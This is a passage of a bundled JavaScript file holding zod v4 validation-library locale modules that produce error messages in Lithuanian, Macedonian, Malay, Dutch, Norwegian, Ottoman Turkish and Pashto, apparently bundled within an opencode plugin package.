    datetime: "ISO data ir laikas",
    date: "ISO data",
    time: "ISO laikas",
    duration: "ISO trukm\u0117",
    ipv4: "IPv4 adresas",
    ipv6: "IPv6 adresas",
    cidrv4: "IPv4 tinklo prefiksas (CIDR)",
    cidrv6: "IPv6 tinklo prefiksas (CIDR)",
    base64: "base64 u\u017Ekoduota eilut\u0117",
    base64url: "base64url u\u017Ekoduota eilut\u0117",
    json_string: "JSON eilut\u0117",
    e164: "E.164 numeris",
    jwt: "JWT",
    template_literal: "\u012Fvestis"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Gautas tipas ${parsedType6(issue3.input)}, o tik\u0117tasi - ${parsedTypeFromType(issue3.expected)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Privalo b\u016Bti ${stringifyPrimitive2(issue3.values[0])}`;
        return `Privalo b\u016Bti vienas i\u0161 ${joinValues2(issue3.values, "|")} pasirinkim\u0173`;
      case "too_big": {
        const origin = parsedTypeFromType(issue3.origin);
        const sizing = getSizing(issue3.origin, getUnitTypeFromNumber2(Number(issue3.maximum)), issue3.inclusive ?? false, "smaller");
        if (sizing?.verb)
          return `${capitalizeFirstCharacter2(origin ?? issue3.origin ?? "reik\u0161m\u0117")} ${sizing.verb} ${issue3.maximum.toString()} ${sizing.unit ?? "element\u0173"}`;
        const adj = issue3.inclusive ? "ne didesnis kaip" : "ma\u017Eesnis kaip";
        return `${capitalizeFirstCharacter2(origin ?? issue3.origin ?? "reik\u0161m\u0117")} turi b\u016Bti ${adj} ${issue3.maximum.toString()} ${sizing?.unit}`;
      }
      case "too_small": {
        const origin = parsedTypeFromType(issue3.origin);
        const sizing = getSizing(issue3.origin, getUnitTypeFromNumber2(Number(issue3.minimum)), issue3.inclusive ?? false, "bigger");
        if (sizing?.verb)
          return `${capitalizeFirstCharacter2(origin ?? issue3.origin ?? "reik\u0161m\u0117")} ${sizing.verb} ${issue3.minimum.toString()} ${sizing.unit ?? "element\u0173"}`;
        const adj = issue3.inclusive ? "ne ma\u017Eesnis kaip" : "didesnis kaip";
        return `${capitalizeFirstCharacter2(origin ?? issue3.origin ?? "reik\u0161m\u0117")} turi b\u016Bti ${adj} ${issue3.minimum.toString()} ${sizing?.unit}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Eilut\u0117 privalo prasid\u0117ti "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Eilut\u0117 privalo pasibaigti "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Eilut\u0117 privalo \u012Ftraukti "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Eilut\u0117 privalo atitikti ${_issue.pattern}`;
        return `Neteisingas ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Skai\u010Dius privalo b\u016Bti ${issue3.divisor} kartotinis.`;
      case "unrecognized_keys":
        return `Neatpa\u017Eint${issue3.keys.length > 1 ? "i" : "as"} rakt${issue3.keys.length > 1 ? "ai" : "as"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return "Rastas klaidingas raktas";
      case "invalid_union":
        return "Klaidinga \u012Fvestis";
      case "invalid_element": {
        const origin = parsedTypeFromType(issue3.origin);
        return `${capitalizeFirstCharacter2(origin ?? issue3.origin ?? "reik\u0161m\u0117")} turi klaiding\u0105 \u012Fvest\u012F`;
      }
      default:
        return "Klaidinga \u012Fvestis";
    }
  };
};
function lt_default2() {
  return {
    localeError: error71()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/mk.js
var error72 = () => {
  const Sizable = {
    string: { unit: "\u0437\u043D\u0430\u0446\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    file: { unit: "\u0431\u0430\u0458\u0442\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    array: { unit: "\u0441\u0442\u0430\u0432\u043A\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    set: { unit: "\u0441\u0442\u0430\u0432\u043A\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0431\u0440\u043E\u0458";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u043D\u0438\u0437\u0430";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0432\u043D\u0435\u0441",
    email: "\u0430\u0434\u0440\u0435\u0441\u0430 \u043D\u0430 \u0435-\u043F\u043E\u0448\u0442\u0430",
    url: "URL",
    emoji: "\u0435\u043C\u043E\u045F\u0438",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0443\u043C \u0438 \u0432\u0440\u0435\u043C\u0435",
    date: "ISO \u0434\u0430\u0442\u0443\u043C",
    time: "ISO \u0432\u0440\u0435\u043C\u0435",
    duration: "ISO \u0432\u0440\u0435\u043C\u0435\u0442\u0440\u0430\u0435\u045A\u0435",
    ipv4: "IPv4 \u0430\u0434\u0440\u0435\u0441\u0430",
    ipv6: "IPv6 \u0430\u0434\u0440\u0435\u0441\u0430",
    cidrv4: "IPv4 \u043E\u043F\u0441\u0435\u0433",
    cidrv6: "IPv6 \u043E\u043F\u0441\u0435\u0433",
    base64: "base64-\u0435\u043D\u043A\u043E\u0434\u0438\u0440\u0430\u043D\u0430 \u043D\u0438\u0437\u0430",
    base64url: "base64url-\u0435\u043D\u043A\u043E\u0434\u0438\u0440\u0430\u043D\u0430 \u043D\u0438\u0437\u0430",
    json_string: "JSON \u043D\u0438\u0437\u0430",
    e164: "E.164 \u0431\u0440\u043E\u0458",
    jwt: "JWT",
    template_literal: "\u0432\u043D\u0435\u0441"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue3.expected}, \u043F\u0440\u0438\u043C\u0435\u043D\u043E ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Invalid input: expected ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u0413\u0440\u0435\u0448\u0430\u043D\u0430 \u043E\u043F\u0446\u0438\u0458\u0430: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 \u0435\u0434\u043D\u0430 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u0433\u043E\u043B\u0435\u043C: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue3.origin ?? "\u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442\u0430"} \u0434\u0430 \u0438\u043C\u0430 ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0438"}`;
        return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u0433\u043E\u043B\u0435\u043C: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue3.origin ?? "\u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442\u0430"} \u0434\u0430 \u0431\u0438\u0434\u0435 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u043C\u0430\u043B: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue3.origin} \u0434\u0430 \u0438\u043C\u0430 ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u043C\u0430\u043B: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue3.origin} \u0434\u0430 \u0431\u0438\u0434\u0435 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0437\u0430\u043F\u043E\u0447\u043D\u0443\u0432\u0430 \u0441\u043E "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0437\u0430\u0432\u0440\u0448\u0443\u0432\u0430 \u0441\u043E "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0432\u043A\u043B\u0443\u0447\u0443\u0432\u0430 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u043E\u0434\u0433\u043E\u0430\u0440\u0430 \u043D\u0430 \u043F\u0430\u0442\u0435\u0440\u043D\u043E\u0442 ${_issue.pattern}`;
        return `Invalid ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0431\u0440\u043E\u0458: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0431\u0438\u0434\u0435 \u0434\u0435\u043B\u0438\u0432 \u0441\u043E ${issue3.divisor}`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "\u041D\u0435\u043F\u0440\u0435\u043F\u043E\u0437\u043D\u0430\u0435\u043D\u0438 \u043A\u043B\u0443\u0447\u0435\u0432\u0438" : "\u041D\u0435\u043F\u0440\u0435\u043F\u043E\u0437\u043D\u0430\u0435\u043D \u043A\u043B\u0443\u0447"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u043A\u043B\u0443\u0447 \u0432\u043E ${issue3.origin}`;
      case "invalid_union":
        return "\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441";
      case "invalid_element":
        return `\u0413\u0440\u0435\u0448\u043D\u0430 \u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442 \u0432\u043E ${issue3.origin}`;
      default:
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441`;
    }
  };
};
function mk_default2() {
  return {
    localeError: error72()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ms.js
var error73 = () => {
  const Sizable = {
    string: { unit: "aksara", verb: "mempunyai" },
    file: { unit: "bait", verb: "mempunyai" },
    array: { unit: "elemen", verb: "mempunyai" },
    set: { unit: "elemen", verb: "mempunyai" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "nombor";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "alamat e-mel",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "tarikh masa ISO",
    date: "tarikh ISO",
    time: "masa ISO",
    duration: "tempoh ISO",
    ipv4: "alamat IPv4",
    ipv6: "alamat IPv6",
    cidrv4: "julat IPv4",
    cidrv6: "julat IPv6",
    base64: "string dikodkan base64",
    base64url: "string dikodkan base64url",
    json_string: "string JSON",
    e164: "nombor E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Input tidak sah: dijangka ${issue3.expected}, diterima ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Input tidak sah: dijangka ${stringifyPrimitive2(issue3.values[0])}`;
        return `Pilihan tidak sah: dijangka salah satu daripada ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Terlalu besar: dijangka ${issue3.origin ?? "nilai"} ${sizing.verb} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elemen"}`;
        return `Terlalu besar: dijangka ${issue3.origin ?? "nilai"} adalah ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Terlalu kecil: dijangka ${issue3.origin} ${sizing.verb} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Terlalu kecil: dijangka ${issue3.origin} adalah ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `String tidak sah: mesti bermula dengan "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `String tidak sah: mesti berakhir dengan "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `String tidak sah: mesti mengandungi "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `String tidak sah: mesti sepadan dengan corak ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} tidak sah`;
      }
      case "not_multiple_of":
        return `Nombor tidak sah: perlu gandaan ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Kunci tidak dikenali: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Kunci tidak sah dalam ${issue3.origin}`;
      case "invalid_union":
        return "Input tidak sah";
      case "invalid_element":
        return `Nilai tidak sah dalam ${issue3.origin}`;
      default:
        return `Input tidak sah`;
    }
  };
};
function ms_default2() {
  return {
    localeError: error73()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/nl.js
var error74 = () => {
  const Sizable = {
    string: { unit: "tekens" },
    file: { unit: "bytes" },
    array: { unit: "elementen" },
    set: { unit: "elementen" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "getal";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "invoer",
    email: "emailadres",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datum en tijd",
    date: "ISO datum",
    time: "ISO tijd",
    duration: "ISO duur",
    ipv4: "IPv4-adres",
    ipv6: "IPv6-adres",
    cidrv4: "IPv4-bereik",
    cidrv6: "IPv6-bereik",
    base64: "base64-gecodeerde tekst",
    base64url: "base64 URL-gecodeerde tekst",
    json_string: "JSON string",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "invoer"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ongeldige invoer: verwacht ${issue3.expected}, ontving ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ongeldige invoer: verwacht ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ongeldige optie: verwacht \xE9\xE9n van ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Te lang: verwacht dat ${issue3.origin ?? "waarde"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementen"} bevat`;
        return `Te lang: verwacht dat ${issue3.origin ?? "waarde"} ${adj}${issue3.maximum.toString()} is`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Te kort: verwacht dat ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit} bevat`;
        }
        return `Te kort: verwacht dat ${issue3.origin} ${adj}${issue3.minimum.toString()} is`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Ongeldige tekst: moet met "${_issue.prefix}" beginnen`;
        }
        if (_issue.format === "ends_with")
          return `Ongeldige tekst: moet op "${_issue.suffix}" eindigen`;
        if (_issue.format === "includes")
          return `Ongeldige tekst: moet "${_issue.includes}" bevatten`;
        if (_issue.format === "regex")
          return `Ongeldige tekst: moet overeenkomen met patroon ${_issue.pattern}`;
        return `Ongeldig: ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ongeldig getal: moet een veelvoud van ${issue3.divisor} zijn`;
      case "unrecognized_keys":
        return `Onbekende key${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Ongeldige key in ${issue3.origin}`;
      case "invalid_union":
        return "Ongeldige invoer";
      case "invalid_element":
        return `Ongeldige waarde in ${issue3.origin}`;
      default:
        return `Ongeldige invoer`;
    }
  };
};
function nl_default2() {
  return {
    localeError: error74()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/no.js
var error75 = () => {
  const Sizable = {
    string: { unit: "tegn", verb: "\xE5 ha" },
    file: { unit: "bytes", verb: "\xE5 ha" },
    array: { unit: "elementer", verb: "\xE5 inneholde" },
    set: { unit: "elementer", verb: "\xE5 inneholde" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "tall";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "liste";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "e-postadresse",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dato- og klokkeslett",
    date: "ISO-dato",
    time: "ISO-klokkeslett",
    duration: "ISO-varighet",
    ipv4: "IPv4-omr\xE5de",
    ipv6: "IPv6-omr\xE5de",
    cidrv4: "IPv4-spekter",
    cidrv6: "IPv6-spekter",
    base64: "base64-enkodet streng",
    base64url: "base64url-enkodet streng",
    json_string: "JSON-streng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ugyldig input: forventet ${issue3.expected}, fikk ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ugyldig verdi: forventet ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ugyldig valg: forventet en av ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `For stor(t): forventet ${issue3.origin ?? "value"} til \xE5 ha ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementer"}`;
        return `For stor(t): forventet ${issue3.origin ?? "value"} til \xE5 ha ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `For lite(n): forventet ${issue3.origin} til \xE5 ha ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `For lite(n): forventet ${issue3.origin} til \xE5 ha ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Ugyldig streng: m\xE5 starte med "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Ugyldig streng: m\xE5 ende med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ugyldig streng: m\xE5 inneholde "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ugyldig streng: m\xE5 matche m\xF8nsteret ${_issue.pattern}`;
        return `Ugyldig ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ugyldig tall: m\xE5 v\xE6re et multiplum av ${issue3.divisor}`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "Ukjente n\xF8kler" : "Ukjent n\xF8kkel"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Ugyldig n\xF8kkel i ${issue3.origin}`;
      case "invalid_union":
        return "Ugyldig input";
      case "invalid_element":
        return `Ugyldig verdi i ${issue3.origin}`;
      default:
        return `Ugyldig input`;
    }
  };
};
function no_default2() {
  return {
    localeError: error75()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ota.js
var error76 = () => {
  const Sizable = {
    string: { unit: "harf", verb: "olmal\u0131d\u0131r" },
    file: { unit: "bayt", verb: "olmal\u0131d\u0131r" },
    array: { unit: "unsur", verb: "olmal\u0131d\u0131r" },
    set: { unit: "unsur", verb: "olmal\u0131d\u0131r" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "numara";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "saf";
        }
        if (data === null) {
          return "gayb";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "giren",
    email: "epostag\xE2h",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO heng\xE2m\u0131",
    date: "ISO tarihi",
    time: "ISO zaman\u0131",
    duration: "ISO m\xFCddeti",
    ipv4: "IPv4 ni\u015F\xE2n\u0131",
    ipv6: "IPv6 ni\u015F\xE2n\u0131",
    cidrv4: "IPv4 menzili",
    cidrv6: "IPv6 menzili",
    base64: "base64-\u015Fifreli metin",
    base64url: "base64url-\u015Fifreli metin",
    json_string: "JSON metin",
    e164: "E.164 say\u0131s\u0131",
    jwt: "JWT",
    template_literal: "giren"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `F\xE2sit giren: umulan ${issue3.expected}, al\u0131nan ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `F\xE2sit giren: umulan ${stringifyPrimitive2(issue3.values[0])}`;
        return `F\xE2sit tercih: m\xFBteberler ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Fazla b\xFCy\xFCk: ${issue3.origin ?? "value"}, ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elements"} sahip olmal\u0131yd\u0131.`;
        return `Fazla b\xFCy\xFCk: ${issue3.origin ?? "value"}, ${adj}${issue3.maximum.toString()} olmal\u0131yd\u0131.`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Fazla k\xFC\xE7\xFCk: ${issue3.origin}, ${adj}${issue3.minimum.toString()} ${sizing.unit} sahip olmal\u0131yd\u0131.`;
        }
        return `Fazla k\xFC\xE7\xFCk: ${issue3.origin}, ${adj}${issue3.minimum.toString()} olmal\u0131yd\u0131.`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `F\xE2sit metin: "${_issue.prefix}" ile ba\u015Flamal\u0131.`;
        if (_issue.format === "ends_with")
          return `F\xE2sit metin: "${_issue.suffix}" ile bitmeli.`;
        if (_issue.format === "includes")
          return `F\xE2sit metin: "${_issue.includes}" ihtiv\xE2 etmeli.`;
        if (_issue.format === "regex")
          return `F\xE2sit metin: ${_issue.pattern} nak\u015F\u0131na uymal\u0131.`;
        return `F\xE2sit ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `F\xE2sit say\u0131: ${issue3.divisor} kat\u0131 olmal\u0131yd\u0131.`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan anahtar ${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `${issue3.origin} i\xE7in tan\u0131nmayan anahtar var.`;
      case "invalid_union":
        return "Giren tan\u0131namad\u0131.";
      case "invalid_element":
        return `${issue3.origin} i\xE7in tan\u0131nmayan k\u0131ymet var.`;
      default:
        return `K\u0131ymet tan\u0131namad\u0131.`;
    }
  };
};
function ota_default2() {
  return {
    localeError: error76()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ps.js
var error77 = () => {
  const Sizable = {
    string: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" },
    file: { unit: "\u0628\u0627\u06CC\u067C\u0633", verb: "\u0648\u0644\u0631\u064A" },
    array: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" },
    set: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0639\u062F\u062F";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u0627\u0631\u06D0";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0648\u0631\u0648\u062F\u064A",
    email: "\u0628\u0631\u06CC\u069A\u0646\u0627\u0644\u06CC\u06A9",
    url: "\u06CC\u0648 \u0622\u0631 \u0627\u0644",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u064A",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0646\u06CC\u067C\u0647 \u0627\u0648 \u0648\u062E\u062A",
    date: "\u0646\u06D0\u067C\u0647",
    time: "\u0648\u062E\u062A",
    duration: "\u0645\u0648\u062F\u0647",
    ipv4: "\u062F IPv4 \u067E\u062A\u0647",
    ipv6: "\u062F IPv6 \u067E\u062A\u0647",
    cidrv4: "\u062F IPv4 \u0633\u0627\u062D\u0647",
    cidrv6: "\u062F IPv6 \u0633\u0627\u062D\u0647",
    base64: "base64-encoded \u0645\u062A\u0646",
    base64url: "base64url-encoded \u0645\u062A\u0646",
    json_string: "JSON \u0645\u062A\u0646",
    e164: "\u062F E.164 \u0634\u0645\u06D0\u0631\u0647",
    jwt: "JWT",
    template_literal: "\u0648\u0631\u0648\u062F\u064A"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0646\u0627\u0633\u0645 \u0648\u0631\u0648\u062F\u064A: \u0628\u0627\u06CC\u062F ${issue3.expected} \u0648\u0627\u06CC, \u0645\u06AB\u0631 ${parsedType7(issue3.input)} \u062A\u0631\u0644\u0627\u0633\u0647 \u0634\u0648`;
      case "invalid_value":
        if (issue3.values.length === 1) {
          return `\u0646\u0627\u0633\u0645 \u0648\u0631\u0648\u062F\u064A: \u0628\u0627\u06CC\u062F ${stringifyPrimitive2(issue3.values[0])} \u0648\u0627\u06CC`;
        }
        return `\u0646\u0627\u0633\u0645 \u0627\u0646\u062A\u062E\u0627\u0628: \u0628\u0627\u06CC\u062F \u06CC\u0648 \u0644\u0647 ${joinValues2(issue3.values, "|")} \u0685\u062E\u0647 \u0648\u0627\u06CC`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
